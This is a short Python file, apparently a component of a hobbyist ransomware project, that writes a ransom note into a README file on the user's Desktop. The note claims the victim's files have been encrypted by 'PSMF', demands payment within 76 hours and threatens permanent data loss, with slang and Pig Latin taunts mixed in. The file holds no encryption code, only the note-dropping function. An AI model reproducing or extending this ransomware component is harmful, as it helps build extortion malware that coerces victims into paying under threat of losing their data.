import os

def notify():
	message='''What do lahd!!!

Your documents, photos, databases and other important files have been encrypted cuzzy. Your files are encrypted by PSMF with the use of our powerful EMA. A unique key has been generated to decrypt your files.

Private decryption key is stored on a secret server and the files cannot be decrypted without the key. You will get only receive the private key, if you make the payment to PSMF.

You have 76 hours to submit the payment. If you do not send the money within the specified time your data will permenently be encrypted and nobody will be able to decrypt them. Ontday uckfay rounday adlay. 
'''

	desktop=os.getenv('HOME')+"/Desktop/"
	messagefile=desktop+"README"

	mfile=open(messagefile,'w')
	mfile.write(message)
	mfile.close()
